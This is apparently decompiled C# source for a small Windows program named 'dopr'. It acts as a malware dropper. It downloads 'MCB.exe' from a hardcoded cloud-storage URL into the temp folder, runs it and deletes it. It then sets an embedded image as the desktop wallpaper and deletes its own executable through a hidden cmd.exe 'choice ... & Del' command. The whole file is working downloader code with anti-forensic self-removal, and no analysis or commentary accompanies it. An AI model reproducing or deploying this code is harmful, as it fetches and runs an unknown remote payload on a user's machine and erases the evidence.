using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using dopr.Properties;

namespace dopr;

internal class dopr
{
	private static string MCBExecutableUrl = "https://s3.eu-central-1.wasabisys.com/nig43t8g439i/MCB.exe";

	private static string downloadPath = Path.Combine(Path.GetTempPath(), "MCB\\");

	private static void Main(string[] args)
	{
		if (!Directory.Exists(downloadPath))
		{
			Directory.CreateDirectory(downloadPath);
		}
		RunMCB();
		SetBackground();
	}

	private static void SetBackground()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		ImageConverter val = new ImageConverter();
		string path = Path.Combine(downloadPath, "mcb.png");
		File.WriteAllBytes(path, (byte[])((TypeConverter)(object)val).ConvertTo((object?)Resources.mcb, typeof(byte[])));
		Wallpaper.Set(path);
	}

	private static void RunMCB()
	{
		string text = Path.Combine(downloadPath, "mcb.exe");
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile(MCBExecutableUrl, text);
		}
		Process.Start(text).WaitForExit();
		File.Delete(text);
		AutoDestroy();
	}

	private static void AutoDestroy()
	{
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetExecutingAssembly().Location + "\"",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
	}
}
